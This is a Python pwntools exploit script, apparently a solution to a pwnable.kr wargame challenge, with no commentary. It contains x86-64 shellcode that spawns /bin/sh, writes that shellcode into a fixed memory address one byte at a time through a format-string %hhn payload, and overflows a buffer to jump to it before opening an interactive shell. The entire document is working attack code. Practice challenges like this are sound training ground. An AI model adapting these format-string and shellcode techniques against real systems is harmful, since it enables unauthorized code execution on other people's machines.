#!/usr/bin/python

from pwn import *

shellcode = '\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
dest_addr = 0x602210

t = remote('pwnable.kr', 9011)

t.sendline('elklepo')
for i in range(len(shellcode)):
    t.sendline('2')
    payload = r'%{}c%8$hhn  {}'.format(str(ord(shellcode[i])).rjust(6), p64(dest_addr + i)) 
    t.sendline(payload)

t.sendline('4')
t.sendline('n')
t.sendline('3')
t.sendline('A' * 24 + p64(dest_addr) * 4)

t.interactive()

